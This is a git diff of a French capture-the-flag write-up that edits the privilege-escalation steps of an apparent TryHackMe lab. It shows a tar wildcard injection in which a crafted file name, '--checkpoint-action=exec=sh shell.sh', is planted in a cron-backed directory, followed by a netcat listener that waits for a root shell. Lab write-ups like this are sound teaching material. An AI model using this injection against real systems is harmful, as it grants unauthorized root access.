@@ -140,7 +140,7 @@ andre@cmess:~$ cat user.txt
 thm{c52**************************}
 ```
 # Privesc to root !
-J'importe lse et l'executer. Il trouve quelque chose d'intéressant dans les taches cron :
+J'importe LSE *(Linux Smart Enumeration)* et l'execute. Il trouve quelque chose d'intéressant dans les taches cron :
 ```
 [!] ret060 Can we write to executable paths present in cron jobs........... yes!
 ---
@@ -152,7 +152,9 @@ andre@cmess:~/backup$ cat note
 Note to self.
 Anything in here will be backed up!
 ```
-On va utilise les checkpoints de tar pour executer un shell.
+On va donc utiliser les checkpoints de **tar** pour executer un shell.
+
+Voici la marche à suivre:
 
 1) On créer le shell
 ```
@@ -167,7 +169,7 @@ touch -- "--checkpoint-action=exec=sh shell.sh"
 ```
 nc -lnvp 1234
 ```
-4) On attend que la tache cron s'executer .
+4) On attend que la tache cron s'execute .
 Et nous voila root
 ```
 ┌──(kali㉿kali)-[~]
